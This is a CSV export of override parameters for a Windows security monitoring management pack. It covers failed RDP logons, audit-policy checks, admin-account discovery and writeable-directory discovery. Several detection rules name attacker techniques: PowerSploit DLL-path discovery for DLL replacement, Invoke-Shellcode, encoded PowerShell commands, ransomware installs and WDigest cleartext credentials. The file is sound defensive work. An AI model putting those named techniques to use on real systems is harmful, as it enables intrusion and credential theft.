Security.Monitoring,SecurityMonitoring.Event.FailedLogin,Rule,Security Monitoring: Failed RDP Logon,,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoring.Event.FailedLogin,Rule,Security Monitoring: Failed RDP Logon,,Count,int,5,5,5,
Security.Monitoring,SecurityMonitoring.Event.FailedLogin,Rule,Security Monitoring: Failed RDP Logon,,IntervalSeconds,int,300,300,300,
Security.Monitoring,SecurityMonitoring.Event.FailedLogin,Rule,Security Monitoring: Failed RDP Logon,,IPExlusionRegEx,string,,,,
Security.Monitoring,SecurityMonitoring.Event.FailedLogin,Rule,Security Monitoring: Failed RDP Logon,,Severity,int,1,1,1,
Security.Monitoring,SecurityMonitoring.Event.FailedLogin,Rule,Security Monitoring: Failed RDP Logon,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.SystemRestarted,Rule,Security Monitoring:  A system was restarted,"This is not necessarily a security event, and as such this is disabled by default, but it can be useful in tracking security events or bad business practice.",Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Event.SystemRestarted,Rule,Security Monitoring:  A system was restarted,"This is not necessarily a security event, and as such this is disabled by default, but it can be useful in tracking security events or bad business practice.",Severity,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.SystemRestarted,Rule,Security Monitoring:  A system was restarted,"This is not necessarily a security event, and as such this is disabled by default, but it can be useful in tracking security events or bad business practice.",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.EventCollection.SpecialGroupLogon,Rule,Security Monitoring Collection:  Event ID 4694,,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,SecurityMonitoringMP.EventCollection.SpecialGroupLogon,Rule,Security Monitoring Collection:  Event ID 4694,,AllowProxying,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.CredentialSwap,Rule,Security Monitoring Forwarded Events:  Potential Credential Swap in Progress,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.CredentialSwap,Rule,Security Monitoring Forwarded Events:  Potential Credential Swap in Progress,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.CredentialSwap,Rule,Security Monitoring Forwarded Events:  Potential Credential Swap in Progress,,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.PowerShellLog.GetDLLLoadPath,Rule,Security Monitoring:  Powersploit Get DLL Load Path is in Use,Get-DLLLoad Path is used to find the name and location of a DLL that an application is using.  The DLL can then be replaced with a malicious copy.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.PowerShellLog.GetDLLLoadPath,Rule,Security Monitoring:  Powersploit Get DLL Load Path is in Use,Get-DLLLoad Path is used to find the name and location of a DLL that an application is using.  The DLL can then be replaced with a malicious copy.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.PowerShellLog.GetDLLLoadPath,Rule,Security Monitoring:  Powersploit Get DLL Load Path is in Use,Get-DLLLoad Path is used to find the name and location of a DLL that an application is using.  The DLL can then be replaced with a malicious copy.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.Event.InvokeEncodedCommand,Rule,Security Monitoring:  PowerShell used to Invoke an Encoded Command,"One way to get around PowerShell parsing issues is to encode a command to a Base64 string. An attacker can also use this to obscure what they are really doing. This may be normal, and it may be malicious. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.Event.InvokeEncodedCommand,Rule,Security Monitoring:  PowerShell used to Invoke an Encoded Command,"One way to get around PowerShell parsing issues is to encode a command to a Base64 string. An attacker can also use this to obscure what they are really doing. This may be normal, and it may be malicious. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",OverrideablePath2,string,,,,
Security.Monitoring,Security.Monitoring.Event.InvokeEncodedCommand,Rule,Security Monitoring:  PowerShell used to Invoke an Encoded Command,"One way to get around PowerShell parsing issues is to encode a command to a Base64 string. An attacker can also use this to obscure what they are really doing. This may be normal, and it may be malicious. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",OverrideablePath1,string,,,,
Security.Monitoring,Security.Monitoring.Event.InvokeEncodedCommand,Rule,Security Monitoring:  PowerShell used to Invoke an Encoded Command,"One way to get around PowerShell parsing issues is to encode a command to a Base64 string. An attacker can also use this to obscure what they are really doing. This may be normal, and it may be malicious. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.Event.InvokeEncodedCommand,Rule,Security Monitoring:  PowerShell used to Invoke an Encoded Command,"One way to get around PowerShell parsing issues is to encode a command to a Base64 string. An attacker can also use this to obscure what they are really doing. This may be normal, and it may be malicious. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.EventCollection.4672,Rule,Security Monitoring Collection:  Event ID 4672,,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.EventCollection.4672,Rule,Security Monitoring Collection:  Event ID 4672,,AllowProxying,bool,FALSE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ScheduledTaskCreatedOnServer,Rule,Security Monitoring: A Scheduled Task Was Created On Server,A scheduled task was created on this server.,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ScheduledTaskCreatedOnServer,Rule,Security Monitoring: A Scheduled Task Was Created On Server,A scheduled task was created on this server.,App3,string,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ScheduledTaskCreatedOnServer,Rule,Security Monitoring: A Scheduled Task Was Created On Server,A scheduled task was created on this server.,App1,string,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ScheduledTaskCreatedOnServer,Rule,Security Monitoring: A Scheduled Task Was Created On Server,A scheduled task was created on this server.,App4,string,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ScheduledTaskCreatedOnServer,Rule,Security Monitoring: A Scheduled Task Was Created On Server,A scheduled task was created on this server.,App5,string,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ScheduledTaskCreatedOnServer,Rule,Security Monitoring: A Scheduled Task Was Created On Server,A scheduled task was created on this server.,App2,string,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ScheduledTaskCreatedOnServer,Rule,Security Monitoring: A Scheduled Task Was Created On Server,A scheduled task was created on this server.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ScheduledTaskCreatedOnServer,Rule,Security Monitoring: A Scheduled Task Was Created On Server,A scheduled task was created on this server.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.CollectLAPSEvents,Rule,Security Monitoring Forwarded Events: Collect LAPS Events,Description for the new event collection rule.,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.CollectLAPSEvents,Rule,Security Monitoring Forwarded Events: Collect LAPS Events,Description for the new event collection rule.,AllowProxying,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Event.SystemPoweredOff,Rule,Security Monitoring:  A system has been powered off,"This is not necessarily a security event, and as such it can generate noise and is off by default.",Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Event.SystemPoweredOff,Rule,Security Monitoring:  A system has been powered off,"This is not necessarily a security event, and as such it can generate noise and is off by default.",Severity,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.SystemPoweredOff,Rule,Security Monitoring:  A system has been powered off,"This is not necessarily a security event, and as such it can generate noise and is off by default.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeShellCodeInUse,Rule,Security Monitoring:  Invoke ShellCode is in Use,Description for the new alert rule.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeShellCodeInUse,Rule,Security Monitoring:  Invoke ShellCode is in Use,Description for the new alert rule.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeShellCodeInUse,Rule,Security Monitoring:  Invoke ShellCode is in Use,Description for the new alert rule.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.4688.GenericCryptoRansomWare,Rule,Security Monitoring Forwarded Events:  Possible Crypto-Ransomware Installed on Computer,"This rule looks for common process creation events seen when certain types of malware are installed on a server.  While it likely won't be useful for something that immediately acts, it could potentially detect versions configured to activate at a later time.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.4688.GenericCryptoRansomWare,Rule,Security Monitoring Forwarded Events:  Possible Crypto-Ransomware Installed on Computer,"This rule looks for common process creation events seen when certain types of malware are installed on a server.  While it likely won't be useful for something that immediately acts, it could potentially detect versions configured to activate at a later time.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.4688.GenericCryptoRansomWare,Rule,Security Monitoring Forwarded Events:  Possible Crypto-Ransomware Installed on Computer,"This rule looks for common process creation events seen when certain types of malware are installed on a server.  While it likely won't be useful for something that immediately acts, it could potentially detect versions configured to activate at a later time.",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousReg,Rule,Security Monitoring:  A suspicious process creation (registry) was executed,This rule inventories 4688 events and flags alerts for manually added registry keys.  These are rare events and should be investigated when they appear.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousReg,Rule,Security Monitoring:  A suspicious process creation (registry) was executed,This rule inventories 4688 events and flags alerts for manually added registry keys.  These are rare events and should be investigated when they appear.,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousReg,Rule,Security Monitoring:  A suspicious process creation (registry) was executed,This rule inventories 4688 events and flags alerts for manually added registry keys.  These are rare events and should be investigated when they appear.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoring.Failed.Login.Attempts.Collection,Rule,Collect Failed Login Attemts,Failed Login Attempts,Enabled,bool,TRUE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoring.Failed.Login.Attempts.Collection,Rule,Collect Failed Login Attemts,Failed Login Attempts,AllowProxying,bool,FALSE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.IncludeCommandLineProcessCreationonMS,UnitMonitor,Security Monitoring: Include Command Line for Process Auditing Setting on Member Servers,This monitor will look at the registry key that needs to be set to include command line in 4688 events,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.UserAccountMgmtMS,UnitMonitor,Security Monitoring: User Account Management Audit Setting not Set on Member Servers,"Monitors ""Security Group Management"" auditing setting",Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.UserAccountMgmtMS,UnitMonitor,Security Monitoring: User Account Management Audit Setting not Set on Member Servers,"Monitors ""Security Group Management"" auditing setting",SyncTime,string,,,,
Security.Monitoring,Security.Monitoring.UserAccountMgmtMS,UnitMonitor,Security Monitoring: User Account Management Audit Setting not Set on Member Servers,"Monitors ""Security Group Management"" auditing setting",IntervalSeconds,int,86400,86400,86400,
Security.Monitoring,Security.Monitoring.SpecialGroupLogonAuditingEnabledonDC,UnitMonitor,Security Monitoring:  Domain Controller Special Group Logon,This monitor watches the audit policy settings for Special Group Logon. See https://blogs.technet.microsoft.com/jepayne/2015/11/26/tracking-lateral-movement-part-one-special-groups-and-specific-service-accounts/  for details.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.SpecialGroupLogonAuditingEnabledonDC,UnitMonitor,Security Monitoring:  Domain Controller Special Group Logon,This monitor watches the audit policy settings for Special Group Logon. See https://blogs.technet.microsoft.com/jepayne/2015/11/26/tracking-lateral-movement-part-one-special-groups-and-specific-service-accounts/  for details.,SyncTime,string,,,,
Security.Monitoring,Security.Monitoring.SpecialGroupLogonAuditingEnabledonDC,UnitMonitor,Security Monitoring:  Domain Controller Special Group Logon,This monitor watches the audit policy settings for Special Group Logon. See https://blogs.technet.microsoft.com/jepayne/2015/11/26/tracking-lateral-movement-part-one-special-groups-and-specific-service-accounts/  for details.,IntervalSeconds,int,86400,86400,86400,
Security.Monitoring,Security.Monitoring.ProcessCreationMemberServer,UnitMonitor,Security Monitoring: Process Creation Setting for Member Servers,Description for the new unit monitor.,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.ProcessCreationMemberServer,UnitMonitor,Security Monitoring: Process Creation Setting for Member Servers,Description for the new unit monitor.,SyncTime,string,,,,
Security.Monitoring,Security.Monitoring.ProcessCreationMemberServer,UnitMonitor,Security Monitoring: Process Creation Setting for Member Servers,Description for the new unit monitor.,IntervalSeconds,int,86400,86400,86400,
Security.Monitoring,Security.Monitoring.DirectoryServiceChangeAuditing,UnitMonitor,Security Monitoring: Directory Service Change Monitoring not Set on DCs,Monitors directory service change auditing setting,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.DirectoryServiceChangeAuditing,UnitMonitor,Security Monitoring: Directory Service Change Monitoring not Set on DCs,Monitors directory service change auditing setting,SyncTime,string,,,,
Security.Monitoring,Security.Monitoring.DirectoryServiceChangeAuditing,UnitMonitor,Security Monitoring: Directory Service Change Monitoring not Set on DCs,Monitors directory service change auditing setting,IntervalSeconds,int,86400,86400,86400,
Security.Monitoring,Security.Monitoring.SecurityAudit.ProcessCreationDC,UnitMonitor,Security Monitoring: Audit Process Creation Set on DC,"This Monitor is for Security Monitoring configuration settings only. It will not generate alerts, but the state view will show you where your gaps are in monitoring. This will monitor the Audit Process Creation setting on Domain Controllers.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.SecurityAudit.ProcessCreationDC,UnitMonitor,Security Monitoring: Audit Process Creation Set on DC,"This Monitor is for Security Monitoring configuration settings only. It will not generate alerts, but the state view will show you where your gaps are in monitoring. This will monitor the Audit Process Creation setting on Domain Controllers.",SyncTime,string,,,,
Security.Monitoring,Security.Monitoring.SecurityAudit.ProcessCreationDC,UnitMonitor,Security Monitoring: Audit Process Creation Set on DC,"This Monitor is for Security Monitoring configuration settings only. It will not generate alerts, but the state view will show you where your gaps are in monitoring. This will monitor the Audit Process Creation setting on Domain Controllers.",IntervalSeconds,int,86400,86400,86400,
Security.Monitoring,Security.Monitoring.SGManagementDC,UnitMonitor,Security Monitoring: Security Group Management Audit not Set on DCs,Monitors Account Management > Security Group Management for Domain Controllers,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.SGManagementDC,UnitMonitor,Security Monitoring: Security Group Management Audit not Set on DCs,Monitors Account Management > Security Group Management for Domain Controllers,SyncTime,string,,,,
Security.Monitoring,Security.Monitoring.SGManagementDC,UnitMonitor,Security Monitoring: Security Group Management Audit not Set on DCs,Monitors Account Management > Security Group Management for Domain Controllers,IntervalSeconds,int,86400,86400,86400,
Security.Monitoring,Security.Monitoring.Monitors.AuthenticationPackages,UnitMonitor,Security Monitoring: Check Authentication Packages Registry Key,Description for the new unit monitor.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.Monitors.AuthenticationPackages,UnitMonitor,Security Monitoring: Check Authentication Packages Registry Key,Description for the new unit monitor.,RegValue,string,msv1_0,msv1_0,msv1_0,
Security.Monitoring,Security.Monitoring.Monitors.AuthenticationPackages,UnitMonitor,Security Monitoring: Check Authentication Packages Registry Key,Description for the new unit monitor.,IntervalSeconds,int,300,300,300,
Security.Monitoring,Security.Monitoring.Monitors.AuthenticationPackages,UnitMonitor,Security Monitoring: Check Authentication Packages Registry Key,Description for the new unit monitor.,SyncTime,string,,,,
Security.Monitoring,Security.Monitoring.SpecialGroupLogonEnabledOnMemberServers,UnitMonitor,Security Monitoring:  Member Server Special Group Logon,This monitor watches the audit policy settings for Special Group Logon. See https://blogs.technet.microsoft.com/jepayne/2015/11/26/tracking-lateral-movement-part-one-special-groups-and-specific-service-accounts/  for details.,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.SpecialGroupLogonEnabledOnMemberServers,UnitMonitor,Security Monitoring:  Member Server Special Group Logon,This monitor watches the audit policy settings for Special Group Logon. See https://blogs.technet.microsoft.com/jepayne/2015/11/26/tracking-lateral-movement-part-one-special-groups-and-specific-service-accounts/  for details.,SyncTime,string,,,,
Security.Monitoring,Security.Monitoring.SpecialGroupLogonEnabledOnMemberServers,UnitMonitor,Security Monitoring:  Member Server Special Group Logon,This monitor watches the audit policy settings for Special Group Logon. See https://blogs.technet.microsoft.com/jepayne/2015/11/26/tracking-lateral-movement-part-one-special-groups-and-specific-service-accounts/  for details.,IntervalSeconds,int,86400,86400,86400,
Security.Monitoring,Security.Monitoring.AuditAccountLogonMS,UnitMonitor,Security Monitoring: Account Logon Monitoring not Set on Member Servers,Monitors Logon auditing setting on Member Servers.,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.AuditAccountLogonMS,UnitMonitor,Security Monitoring: Account Logon Monitoring not Set on Member Servers,Monitors Logon auditing setting on Member Servers.,SyncTime,string,,,,
Security.Monitoring,Security.Monitoring.AuditAccountLogonMS,UnitMonitor,Security Monitoring: Account Logon Monitoring not Set on Member Servers,Monitors Logon auditing setting on Member Servers.,IntervalSeconds,int,86400,86400,86400,
Security.Monitoring,SecurityMonitoringMP.WDigestRegConfiguredMonitor,UnitMonitor,Security Monitoring:  Wdigest passwords stored in clear text,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.AuditAccountLogonDC,UnitMonitor,Security Monitoring: Account Logon Monitoring not Set on DCs,Monitors Logon auditing setting,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.AuditAccountLogonDC,UnitMonitor,Security Monitoring: Account Logon Monitoring not Set on DCs,Monitors Logon auditing setting,SyncTime,string,,,,
Security.Monitoring,Security.Monitoring.AuditAccountLogonDC,UnitMonitor,Security Monitoring: Account Logon Monitoring not Set on DCs,Monitors Logon auditing setting,IntervalSeconds,int,86400,86400,86400,
Security.Monitoring,SecurityMonitoringMP.UseLogonCredentialExistsMonitor,UnitMonitor,Security Monitoring: UseLogonCredential key does not exist,,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Event.SystemPendingRestart,UnitMonitor,A System - Is Pending Restart,A system has been identified as requiring a system restart. Not all features / functions will be available until after the restart has completed.,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Health.EventCollectorMonitor,UnitMonitor,Security Monitoring:  Event Log Collector Service is stopped,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Health.EventCollectorMonitor,UnitMonitor,Security Monitoring:  Event Log Collector Service is stopped,,CheckStartupType,string,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.IncludeCommandLineProcessCreationonDCs,UnitMonitor,Security Monitoring: Include Command Line for Process Auditing Setting on DCs,This monitor will look at the registry key that needs to be set to include command line in 4688 events,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Event.RepeatedLogonMonitor,UnitMonitor,Security Monitoring:  Repeated RDP Logon Failures,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.AdminAccountDiscovery,Discovery,Security Monitoring: Discover Admin Accounts,"This discovery, once enabled will discover all admin accounts. NOTE: Enable for only one machine and enable on a machine that has the AD PowerShell Module installed.",Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.AdminAccountDiscovery,Discovery,Security Monitoring: Discover Admin Accounts,"This discovery, once enabled will discover all admin accounts. NOTE: Enable for only one machine and enable on a machine that has the AD PowerShell Module installed.",IntervalSeconds,int,86400,86400,86400,
Security.Monitoring,Security.Monitoring.AdminAccountDiscovery,Discovery,Security Monitoring: Discover Admin Accounts,"This discovery, once enabled will discover all admin accounts. NOTE: Enable for only one machine and enable on a machine that has the AD PowerShell Module installed.",TimeoutSeconds,int,300,300,300,
Security.Monitoring,Security.Monitoring.AdminAccountDiscovery,Discovery,Security Monitoring: Discover Admin Accounts,"This discovery, once enabled will discover all admin accounts. NOTE: Enable for only one machine and enable on a machine that has the AD PowerShell Module installed.",SyncTime,string,,,,
Security.Monitoring,Security.Monitoring.DA.DCDiscovery,Discovery,Security Monitoring: Distributed App DC Discovery,Populates Security Monitoring Distributed Application,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.DA.DCDiscovery,Discovery,Security Monitoring: Distributed App DC Discovery,Populates Security Monitoring Distributed Application,IntervalSeconds,int,300,300,300,
Security.Monitoring,Security.Monitoring.Discoveries.UserWriteableLocationSeed,Discovery,Security Monitoring: User Writeable Directories Seed Class,"If reg key to discover user writeable locations on a server is populated, this discovery will initiate the seed discovery",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.Discoveries.UserWriteableLocationSeed,Discovery,Security Monitoring: User Writeable Directories Seed Class,"If reg key to discover user writeable locations on a server is populated, this discovery will initiate the seed discovery",Frequency,int,86400,86400,86400,
Security.Monitoring,Security.Monitoring.DiscoverWriteableFileLocations,Discovery,Security Monitoring: Discover Writeable File Locations,This will discover writeable file locations in windows or program files,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.DiscoverWriteableFileLocations,Discovery,Security Monitoring: Discover Writeable File Locations,This will discover writeable file locations in windows or program files,AdditionalLocations,string,,,,
Security.Monitoring,Security.Monitoring.DiscoverWriteableFileLocations,Discovery,Security Monitoring: Discover Writeable File Locations,This will discover writeable file locations in windows or program files,FrequencyInSeconds,int,86400,86400,86400,
Security.Monitoring,Security.Monitoring.DiscoverWriteableFileLocations,Discovery,Security Monitoring: Discover Writeable File Locations,This will discover writeable file locations in windows or program files,TimeOutSeconds,int,600,600,600,
Security.Monitoring,Security.Monitoring.PopulateExtendedWriteableDirectoryComputerGroup,Discovery,Security Monitoring: Populate Extended Writeable Directory Monitoring Group,This discovery will put the windows computer objects in a group that can be used for overrides.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.DA.MSDiscovery,Discovery,Security Monitoring: Distributed App MemberServer Discovery,Populates Security Monitoring Distributed Application,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.DA.MSDiscovery,Discovery,Security Monitoring: Distributed App MemberServer Discovery,Populates Security Monitoring Distributed Application,IntervalSeconds,int,300,300,300,
Microsoft.Windows.Server.2012.R2.Discovery,Microsoft.Windows.Server.2012.R2.Full.AllServersComputerGroupDiscovery,Discovery,Populate All Windows Server 2012 R2 Full Computer Group,This rule populates the Windows Server 2012 R2 Full Computer Group.,Enabled,bool,TRUE,TRUE,TRUE,
Microsoft.Windows.Server.2012.R2.Discovery,Microsoft.Windows.Server.2012.R2.Computer.Discovery,Discovery,Discover Windows 2012 R2 Servers,This rule discovers Windows 2012 R2 Servers,Enabled,bool,TRUE,TRUE,TRUE,
Microsoft.Windows.Server.2012.R2.Discovery,Microsoft.Windows.Server.2012.R2.Computer.Discovery,Discovery,Discover Windows 2012 R2 Servers,This rule discovers Windows 2012 R2 Servers,IntervalSeconds,int,86400,86400,86400,
Microsoft.Windows.Server.2012.R2.Discovery,Microsoft.Windows.Server.2012.R2.Computer.Discovery,Discovery,Discover Windows 2012 R2 Servers,This rule discovers Windows 2012 R2 Servers,TimeoutSeconds,int,360,360,360,
Microsoft.Windows.Server.2012.R2.Discovery,Microsoft.Windows.Server.2012.R2.AllServersComputerGroupDiscovery,Discovery,Populate All Windows Server 2012 R2 Computer Group,This rule populates the Windows Server 2012 R2 Computer Group.,Enabled,bool,TRUE,TRUE,TRUE,
Microsoft.Windows.Server.2012.R2.Discovery,Microsoft.Windows.Server.2012.R2.Core.AllServersComputerGroupDiscovery,Discovery,Populate All Windows Server 2012 R2 Core Computer Group,This rule populates the Windows Server 2012 R2 Core Computer Group.,Enabled,bool,TRUE,TRUE,TRUE,
Microsoft.Windows.Server.2012.R2.Discovery,Microsoft.Windows.Server.2012.R2.StandardLicense.Discovery,Discovery,License Discovery for Microsoft Windows Server,"This discovery rule discovers and populates the class named “System Center Operations Manager Standard License""",Enabled,bool,TRUE,TRUE,TRUE,
